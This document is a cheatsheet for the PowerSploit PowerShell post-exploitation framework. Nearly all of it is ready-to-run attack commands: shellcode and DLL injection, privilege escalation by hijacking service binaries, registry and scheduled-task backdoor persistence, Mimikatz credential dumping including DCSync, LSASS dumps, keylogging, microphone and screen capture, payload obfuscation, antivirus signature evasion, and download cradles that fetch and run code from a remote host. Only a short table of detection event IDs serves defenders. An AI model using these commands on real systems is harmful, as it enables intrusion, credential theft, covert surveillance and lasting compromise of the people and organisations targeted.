# PowerSploit Cheatsheet — PowerShell Post-Exploitation Framework

## Quick Start

```powershell
# Load all modules
Import-Module .\PowerSploit.psd1

# Load individual script
. .\CodeExecution\Invoke-Shellcode.ps1
. .\Privesc\PowerUp.ps1
. .\Recon\PowerView.ps1

# Remove download warning
$Env:PSModulePath.Split(';') | % { if (Test-Path (Join-Path $_ PowerSploit)) {Get-ChildItem $_ -Recurse | Unblock-File} }
```

## Code Execution

### Reflective PE Injection (No Disk Write)
```powershell
. .\CodeExecution\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath C:\temp\mimikatz.dll
Invoke-ReflectivePEInjection -PEPath C:\temp\payload.dll -ProcessId 1234 -ForceASLR
```

### Shellcode Injection
```powershell
. .\CodeExecution\Invoke-Shellcode.ps1
Invoke-Shellcode -Shellcode @(0xfc,0xe8,0x82,0x00,...)
Invoke-Shellcode -Shellcode (New-Object Net.WebClient).DownloadData('http://192.168.1.100/shellcode.bin')
```

### DLL Injection
```powershell
. .\CodeExecution\Invoke-DllInjection.ps1
Invoke-DllInjection -DllPath C:\temp\payload.dll -ProcessId 1234
```

### WMI Command Execution
```powershell
. .\CodeExecution\Invoke-WmiCommand.ps1
Invoke-WmiCommand -ComputerName 192.168.1.200 -Credential $cred -ScriptBlock { whoami }
```

## Privilege Escalation (PowerUp)

### All Checks
```powershell
. .\Privesc\PowerUp.ps1
Invoke-AllChecks
```

### Individual Checks
```powershell
# Unquoted service paths
Get-UnquotedService

# Modifiable services
Get-ModifiableService

# Service binary hijacking
Write-ServiceBinary -Name 'VulnSvc' -Path 'C:\temp\payload.exe'

# DLL hijacking
Find-ProcessDLLHijack

# Modifiable service EXE
Get-ServiceUnquotedPath
Get-ModifiableServiceFile

# AlwaysInstallElevated
Get-AlwaysInstallElevated

# Unattended install files
Get-UnattendedInstallFile

# Autologon credentials
Get-ModifiableAutologonCredential

# Clipboard contents
Get-ClipboardContents

# KeePass config
Get-KeePassConfig

# Modifiable registry autorun
Get-ModifiableRegistryAutoRun
```

## Persistence

### User-Level
```powershell
. .\Persistence\Persistence.ps1
$opt = New-UserPersistenceOption -RegistryKeyPath "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ScriptPath "C:\temp\backdoor.ps1"
Add-Persistence -ScriptPath "C:\temp\backdoor.ps1" -UserPersistenceOption $opt -Verbose
```

### Elevated
```powershell
$opt = New-ElevatedPersistenceOption -RegistryKeyPath "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Add-Persistence -ScriptPath "C:\temp\backdoor.ps1" -ElevatedPersistenceOption $opt -Verbose
```

### Scheduled Task
```powershell
$opt = New-UserPersistenceOption -ScheduledTask -TaskName "SystemUpdate"
Add-Persistence -ScriptPath "C:\temp\backdoor.ps1" -UserPersistenceOption $opt
```

### Security Support Provider (SSP)
```powershell
. .\Persistence\Install-SSP.ps1
Install-SSP -Path C:\temp\mimilib.dll
```

## Credential Harvesting

### Mimikatz (In-Memory)
```powershell
. .\Exfiltration\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
Invoke-Mimikatz -Command "lsadump::sam"
Invoke-Mimikatz -Command "lsadump::dcsync /domain:corp.local /user:krbtgt"
```

### GPP Passwords
```powershell
. .\Exfiltration\Get-GPPPassword.ps1
Get-GPPPassword
```

### GPP Autologon
```powershell
. .\Exfiltration\Get-GPPAutologon.ps1
Get-GPPAutologon
```

### Token Manipulation
```powershell
. .\Exfiltration\Invoke-TokenManipulation.ps1
Invoke-TokenManipulation -Enumerate
Invoke-TokenManipulation -CreateNewTokenAs "CORP\Admin" -ImpersonateUser
```

### Credential Injection
```powershell
. .\Exfiltration\Invoke-CredentialInjection.ps1
Invoke-CredentialInjection -Username "admin" -Password "P@ssw0rd" -Domain "CORP"
```

### Volume Shadow Copy
```powershell
. .\Exfiltration\New-VolumeShadowCopy.ps1
New-VolumeShadowCopy -Volume 'C:\'
Get-VolumeShadowCopy
Mount-VolumeShadowCopy -Path 'C:\vss' -DevicePath '\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\'
```

### Process Minidump
```powershell
. .\Exfiltration\Out-Minidump.ps1
Out-Minidump -ProcessName lsass
```

### Vault Credentials
```powershell
. .\Exfiltration\Get-VaultCredential.ps1
Get-VaultCredential
```

### Microphone Recording
```powershell
. .\Exfiltration\Get-MicrophoneAudio.ps1
Get-MicrophoneAudio -Path C:\temp\recording.wav -Duration 30
```

### Keystrokes
```powershell
. .\Exfiltration\Get-Keystrokes.ps1
Get-Keystrokes -LogPath C:\temp\keylog.txt -WindowEnumeration
```

### Timed Screenshots
```powershell
. .\Exfiltration\Get-TimedScreenshot.ps1
Get-TimedScreenshot -Path C:\temp\screenshots -Interval 60
```

## Reconnaissance (PowerView)

### Domain Enumeration
```powershell
. .\Recon\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainUser | Select Name,AdminCount
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainComputer
Get-DomainSID
```

### User Hunting
```powershell
Invoke-UserHunter
Invoke-UserHunter -CheckAccess
```

### ACL Enumeration
```powershell
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs
```

### GPO Enumeration
```powershell
Get-DomainGPO
Get-DomainGPO -ComputerIdentity 192.168.1.200
Get-DomainGPOLocalGroup
```

### SPN Scanning (Kerberoasting)
```powershell
Get-DomainSPN -Username "svc_sql"
```

### Site Enumeration
```powershell
Get-DomainSite
Get-DomainSubnet
```

### Permission Hunting
```powershell
Invoke-ACLHunter
```

### Local Groups
```powershell
Get-NetLocalGroup -ComputerName 192.168.1.200
Get-NetLocalGroupMember -ComputerName 192.168.1.200
```

### Session Enumeration
```powershell
Get-NetSession -ComputerName 192.168.1.200
Get-NetLoggedon -ComputerName 192.168.1.200
```

## Port Scanning

```powershell
. .\Recon\Invoke-Portscan.ps1
Invoke-Portscan -Hosts 192.168.1.0/24 -Ports 21,22,80,445,3389
Invoke-Portscan -Hosts 192.168.1.0/24 -Ports "80,443,8080" -ExcludeHosts "192.168.1.1"
```

## HTTP Enumeration

```powershell
. .\Recon\Get-HttpStatus.ps1
Get-HttpStatus -Target target.example.com -Path C:\wordlists\common.txt
```

## Reverse DNS

```powershell
. .\Recon\Invoke-ReverseDnsLookup.ps1
Invoke-ReverseDnsLookup -StartAddress 192.168.1.1 -EndAddress 192.168.1.254
```

## Script Modification

### Encode Command
```powershell
. .\ScriptModification\Out-EncodedCommand.ps1
Out-EncodedCommand -ScriptPath C:\payload.ps1
```

### Compressed DLL
```powershell
. .\ScriptModification\Out-CompressedDll.ps1
Out-CompressedDll -ScriptPath C:\payload.ps1
```

### Encrypted Script
```powershell
. .\ScriptModification\Out-EncryptedScript.ps1
Out-EncryptedScript -ScriptPath C:\payload.ps1 -Password 'P@ssw0rd'
```

### Remove Comments
```powershell
. .\ScriptModification\Remove-Comment.ps1
Remove-Comment -ScriptPath C:\payload.ps1
```

## Antivirus Bypass

```powershell
. .\AntivirusBypass\Find-AVSignature.ps1
Find-AVSignature -FileName C:\payload.exe -Interval 50
```

## In-Memory Execution Patterns

```powershell
# Download cradle
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/script.ps1')
IEX(Invoke-WebRequest -Uri 'http://192.168.1.100/script.ps1' -UseBasicParsing)

# Encoded command
powershell -ep bypass -e <base64_encoded_command>

# Download file
(New-Object Net.WebClient).DownloadFile('http://192.168.1.100/file.exe','C:\temp\file.exe')

# Download and execute
Start-Process -FilePath "C:\temp\file.exe"
```

## Common Workflows

### Initial Post-Exploitation
```powershell
# 1. Download PowerUp
. .\Privesc\PowerUp.ps1

# 2. Run all checks
Invoke-AllChecks

# 3. Exploit finding
Write-ServiceBinary -Name 'VulnSvc' -Path 'C:\temp\payload.exe'

# 4. Restart service
Restart-Service -Name 'VulnSvc'
```

### Domain Recon
```powershell
# 1. Load PowerView
. .\Recon\PowerView.ps1

# 2. Enumerate
Get-Domain | Select Name,DNSRoot
Get-DomainUser -AdminCount | Select Name,ServicePrincipalName
Get-DomainGroupMember -Identity "Domain Admins" | Select Member

# 3. Find targets
Invoke-UserHunter
Get-DomainSPN
```

### Credential Dumping
```powershell
# 1. Load Mimikatz
. .\Exfiltration\Invoke-Mimikatz.ps1

# 2. Logon passwords
Invoke-Mimikatz -Command "sekurlsa::logonpasswords"

# 3. SAM dump
Invoke-Mimikatz -Command "lsadump::sam"

# 4. DCSync
Invoke-Mimikatz -Command "lsadump::dcsync /domain:corp.local /user:krbtgt"
```

## Detection Indicators

| Indicator | Event ID | Log Source |
|-----------|----------|------------|
| PowerShell execution | 4688 | Security |
| Script block logging | 4104 | Windows PowerShell |
| Module logging | 4103 | Windows PowerShell |
| Reflective DLL loaded | 7 | Sysmon |
| CreateRemoteThread | 8 | Sysmon |
| WMI process creation | 19/20 | Sysmon |

## Quick Reference

| Module | Purpose | Key Functions |
|--------|---------|---------------|
| CodeExecution | Execute code | Invoke-Shellcode, Invoke-DllInjection, Invoke-ReflectivePEInjection, Invoke-WmiCommand |
| Privesc | Privilege escalation | Invoke-AllChecks, Get-UnquotedService, Write-ServiceBinary |
| Persistence | Backdoor persistence | Add-Persistence, Install-SSP |
| Exfiltration | Data theft | Invoke-Mimikatz, Get-GPPPassword, Invoke-TokenManipulation, Get-Keystrokes |
| Recon | Domain recon | Get-DomainUser, Get-DomainGroup, Invoke-UserHunter, Get-DomainSPN |
| ScriptModification | Payload prep | Out-EncodedCommand, Out-EncryptedScript |
| AntivirusBypass | AV evasion | Find-AVSignature |
| Mayhem | Destruction | Set-MasterBootRecord, Set-CriticalProcess |
